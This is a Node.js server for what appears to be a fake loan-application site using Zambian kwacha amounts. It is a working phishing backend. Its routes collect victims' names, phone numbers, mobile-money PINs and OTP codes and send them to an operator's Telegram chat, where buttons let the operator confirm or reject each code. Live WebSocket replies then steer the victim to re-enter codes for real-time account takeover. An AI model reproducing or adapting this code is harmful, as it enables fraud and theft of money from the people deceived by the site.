const express = require('express');
const http = require('http');
const https = require('https');
const { WebSocketServer, WebSocket } = require('ws');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(express.static(__dirname));
app.use(express.json());

const sessions = {};

// ═══════════════════════════════════════════
// WEBSOCKET
// ═══════════════════════════════════════════
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://localhost:' + PORT);
    const sessionId = url.searchParams.get('session');

    if (sessionId && sessions[sessionId]) {
        sessions[sessionId].ws = ws;
        console.log('✅ User connected:', sessions[sessionId].name);
    }

    ws.on('close', () => {
        if (sessionId && sessions[sessionId]) {
            sessions[sessionId].ws = null;
        }
    });
});

// ═══════════════════════════════════════════
// TELEGRAM HELPERS
// ═══════════════════════════════════════════
function tgRequest(path, body) {
    return new Promise((resolve, reject) => {
        const payload = JSON.stringify(body);
        const req = https.request({
            method: 'POST',
            hostname: 'api.telegram.org',
            path,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch (e) { resolve({ ok: false, raw: data }); }
            });
        });
        req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

function sendTelegram(text, buttons) {
    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    return tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, body)
        .then(res => {
            if (res.ok) console.log('✅ Telegram sent');
            else console.error('❌ Telegram error:', JSON.stringify(res));
        })
        .catch(err => console.error('❌ Network:', err.message));
}

// ═══════════════════════════════════════════
// API ROUTES
// ═══════════════════════════════════════════
app.post('/api/apply', (req, res) => {
    const { name, phone, amount, period } = req.body;
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    sendTelegram(`📋 *NEW LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
📊 *Interest:* K${interest.toLocaleString()}
💵 *Total Repay:* K${total.toLocaleString()}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`);

    res.json({ success: true });
});

app.post('/api/pin', (req, res) => {
    const { name, phone, amount, period, pin } = req.body;

    sendTelegram(`🔐 *PIN SUBMITTED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔑 *PIN (5 digits):* ${pin}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`);

    res.json({ success: true });
});

app.post('/api/otp', (req, res) => {
    const { name, phone, amount, period, pin, otp } = req.body;
    const sessionId = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

    sessions[sessionId] = { ws: null, name, phone, amount, period, pin, otp };

    const msg = `📲 *OTP RECEIVED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔢 *OTP (4 digits):* ${otp}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━
_Tap to verify OTP_`;

    const buttons = [[
        { text: '✅ Correct OTP', callback_data: `correct_otp:${sessionId}` },
        { text: '❌ Wrong OTP', callback_data: `wrong_otp:${sessionId}` }
    ]];

    sendTelegram(msg, buttons);
    res.json({ success: true, sessionId });
});

app.post('/api/pin-verify', (req, res) => {
    const { sessionId } = req.body;
    const session = sessions[sessionId];
    if (!session) return res.status(404).json({ error: 'Not found' });

    const msg = `🔐 *PIN VERIFICATION*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${session.name}
📱 *Phone:* ${session.phone}
💰 *Amount:* K${session.amount.toLocaleString()}
📅 *Period:* ${session.period} days
🔑 *PIN to verify:* ${session.pin}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━
_Tap to verify PIN_`;

    const buttons = [[
        { text: '✅ Correct PIN', callback_data: `correct_pin:${sessionId}` },
        { text: '❌ Wrong PIN', callback_data: `wrong_pin:${sessionId}` }
    ]];

    sendTelegram(msg, buttons);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// TELEGRAM POLLING
// ═══════════════════════════════════════════
let offset = 0;

async function pollTelegram() {
    try {
        const path = `/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=0`;
        const data = await new Promise((resolve, reject) => {
            const req = https.request({ method: 'GET', hostname: 'api.telegram.org', path }, (res) => {
                let d = '';
                res.on('data', chunk => d += chunk);
                res.on('end', () => {
                    try { resolve(JSON.parse(d)); }
                    catch (e) { resolve({ ok: false }); }
                });
            });
            req.setTimeout(8000, () => { req.destroy(); reject(new Error('timeout')); });
            req.on('error', reject);
            req.end();
        });

        if (data.ok) {
            for (const update of data.result) {
                offset = update.update_id + 1;

                if (update.callback_query) {
                    const cq = update.callback_query;
                    const [action, sessionId] = cq.data.split(':');
                    const session = sessions[sessionId];

                    if (session) {
                        tgRequest(`/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                            callback_query_id: cq.id,
                            text: {
                                'correct_otp': '✅ OTP approved.',
                                'wrong_otp': '❌ OTP rejected.',
                                'correct_pin': '✅ PIN approved! Done.',
                                'wrong_pin': '❌ PIN rejected.'
                            }[action] || 'OK'
                        });

                        if (action === 'correct_otp') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'otp_correct' }));
                            console.log('✅ OTP correct:', session.name);

                        } else if (action === 'wrong_otp') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'otp_wrong' }));
                            sendTelegram(`❌ *OTP REJECTED*\n👤 ${session.name}\n📱 ${session.phone}`);
                            console.log('❌ OTP wrong:', session.name);

                        } else if (action === 'correct_pin') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'pin_correct' }));
                            sendTelegram(`✅ *APPLICATION COMPLETE*\n👤 ${session.name}\n📱 ${session.phone}\n💰 K${session.amount.toLocaleString()}`);
                            console.log('✅ PIN correct — DONE:', session.name);

                        } else if (action === 'wrong_pin') {
                            if (session.ws && session.ws.readyState === WebSocket.OPEN)
                                session.ws.send(JSON.stringify({ type: 'admin_response', result: 'pin_wrong' }));
                            sendTelegram(`❌ *PIN REJECTED*\n👤 ${session.name}\n📱 ${session.phone}\n🔄 User must re-enter`);
                            console.log('❌ PIN wrong:', session.name);
                        }
                    }
                }
            }
        }
    } catch (err) {
        if (err.message !== 'timeout') console.error('Polling:', err.message);
    }
    setTimeout(pollTelegram, 2000);
}

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log(`🚀 Running on port ${PORT}`);
    console.log(`🤖 Telegram polling started`);
    pollTelegram();
});   
